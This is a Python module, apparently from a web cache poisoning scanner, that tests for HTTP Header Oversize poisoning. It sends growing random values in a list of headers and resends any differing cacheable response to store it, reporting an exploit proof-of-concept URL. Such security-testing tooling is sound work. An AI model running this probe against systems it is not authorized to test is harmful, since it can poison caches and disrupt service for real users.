import random
import string
import webbrowser
from core.cache import extract_cache_headers
import core.config

class HHOAttack:
    name = "HTTP Header Oversize"

    TEST_HEADERS = [
        "capitalized host header",
        "x-forwarded-proto",
        "x-http-method-override",
        "x-amz-website-redirect-location",
        "authorization",
        "x-rewrite-url",
        "x-original-host",
        "x-forwarded-prefix",
        "x-amz-server-side-encryption",
        "trailer",
        "fastly-ssl",
        "fastly-host",
        "fastly-ff",
        "fastly-client-ip",
        "content-type",
        "api-version",
        "acunetix-header",
        "accept-version",
        "x-timer",
    ]

    def run(self, ctx):
        ctx.log.debug(f"Testing for {self.name}")

        for header in self.TEST_HEADERS:
            size = 254

            while size <= 4064:
                value = ''.join(random.choices(string.ascii_letters, k=size))

                headers = ctx.headers.copy()
                headers[header] = value

                resp, cb = ctx.req.send(ctx.method, ctx.url, headers, ctx.body)

                if resp is None:
                    break

                if ctx.is_different(resp):
                    if extract_cache_headers(resp):
                        # Send the same request one more time to save the cache
                        _, _ = ctx.req.send(ctx.method, ctx.url, headers, ctx.body, True, cb)
                        ctx.log.vuln(f"HHO via {header} size={size} | Exploit PoC: {ctx.url}?{cb}")

                        if core.config.open_browser:
                            webbrowser.open_new_tab(f"{ctx.url}?{cb}")
                        return

                size *= 2

        ctx.log.error("Not vulnerable")